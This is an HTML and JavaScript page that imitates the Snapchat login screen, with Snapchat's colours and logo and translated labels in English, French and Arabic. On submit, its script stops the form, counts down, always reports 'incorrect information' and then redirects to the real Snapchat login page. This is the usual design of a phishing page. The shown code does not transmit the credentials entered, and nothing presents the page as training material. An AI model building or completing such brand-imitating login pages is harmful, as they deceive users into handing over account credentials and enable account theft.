<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
            background-color: #FFFC00; /* اللون الأصفر لسناب شات */
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .container {
            width: 90%;
            max-width: 400px;
            background-color: white;
            border-radius: 20px;
            padding: 30px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
            text-align: center;
        }

        .logo {
            width: 60px;
            margin: 0 auto 20px;
        }

        h1 {
            font-size: 24px;
            color: #333;
            margin-bottom: 30px;
        }

        label {
            display: block;
            font-size: 14px;
            color: #aaa;
            margin-bottom: 5px;
        }

        input {
            width: 100%;
            padding: 10px;
            font-size: 16px;
            border: none;
            border-bottom: 1px solid #ccc;
            margin-bottom: 20px;
            box-sizing: border-box;
        }

        a {
            font-size: 14px;
            color: #007bff;
            text-decoration: none;
            display: block;
            text-align: center;
            margin-bottom: 20px;
        }

        a:hover {
            text-decoration: underline;
        }

        button {
            width: 100%;
            padding: 15px;
            background-color: #FFFC00;
            color: black;
            border: none;
            border-radius: 25px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }

        button:hover {
            background-color: #fef200;
        }

        .signup-btn {
            font-size: 14px;
            color: #007bff;
            text-decoration: none;
            margin-top: 10px;
            display: inline-block;
        }

        .signup-btn:hover {
            text-decoration: underline;
        }

        .message {
            font-size: 16px;
            color: red;
            margin-top: 20px;
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <img class="logo" src="https://1000logos.net/wp-content/uploads/2017/08/Snapchat-logo.png" alt="Snapchat Logo">
        <h1 id="title"></h1>
        <form onsubmit="simulateLogin(event)">
            <label id="username-label" for="username"></label>
            <input type="text" id="username" name="username" required>

            <label id="password-label" for="password"></label>
            <input type="password" id="password" name="password" required>

            <a id="forgot-password" href="#"></a>

            <button type="submit" id="submit-button"></button>
        </form>
        <a class="signup-btn" href="https://accounts.snapchat.com/v2/signup?continue=%2Faccounts%2Fwelcome">
            Vous débutez sur Snapchat ? Sʼinscrire
        </a>
        <div class="message" id="error-message"></div>
    </div>

    <script>
        const translations = {
            en: {
                title: "Login",
                usernameLabel: "Username, email address, or phone number",
                passwordLabel: "Password",
                forgotPassword: "Forgot your password?",
                submitButton: "Login",
                errorMessage: "Incorrect information. Please try again.",
            },
            fr: {
                title: "Connexion",
                usernameLabel: "Nom d'utilisateur, adresse e-mail ou numéro de téléphone",
                passwordLabel: "Mot de passe",
                forgotPassword: "Mot de passe oublié ?",
                submitButton: "Connexion",
                errorMessage: "Informations incorrectes. Veuillez réessayer.",
            },
            ar: {
                title: "تسجيل الدخول",
                usernameLabel: "اسم المستخدم أو البريد الإلكتروني أو رقم الهاتف",
                passwordLabel: "كلمة المرور",
                forgotPassword: "هل نسيت كلمة المرور؟",
                submitButton: "تسجيل الدخول",
                errorMessage: "المعلومات خاطئة. حاول مرة أخرى.",
            },
        };

        function getLanguage() {
            const lang = navigator.language || navigator.userLanguage;
            return lang.split('-')[0]; // أخذ اللغة الأساسية فقط (مثل "en" من "en-US")
        }

        function applyTranslations() {
            const lang = getLanguage();
            const texts = translations[lang] || translations["en"]; // افتراضي إلى الإنجليزية إذا كانت اللغة غير مدعومة

            document.getElementById("title").textContent = texts.title;
            document.getElementById("username-label").textContent = texts.usernameLabel;
            document.getElementById("password-label").textContent = texts.passwordLabel;
            document.getElementById("forgot-password").textContent = texts.forgotPassword;
            document.getElementById("submit-button").textContent = texts.submitButton;
            document.getElementById("error-message").textContent = texts.errorMessage;
        }

        applyTranslations();

        function simulateLogin(event) {
            event.preventDefault();

            const errorMessage = document.getElementById("error-message");
            let countdown = 5;

            errorMessage.style.display = "block";

            const countdownInterval = setInterval(() => {
                errorMessage.textContent = `${countdown}...`;
                countdown--;

                if (countdown < 0) {
                    clearInterval(countdownInterval);
                    errorMessage.textContent = translations[getLanguage()].errorMessage;

                    // تأخير لإعادة المحاولة
                    setTimeout(() => {
                        window.location.href = "https://accounts.snapchat.com/accounts/login";
                    }, 2000); // التوجيه بعد 2 ثانية
                }
            }, 1000);
        }
    </script>
</body>
</html>
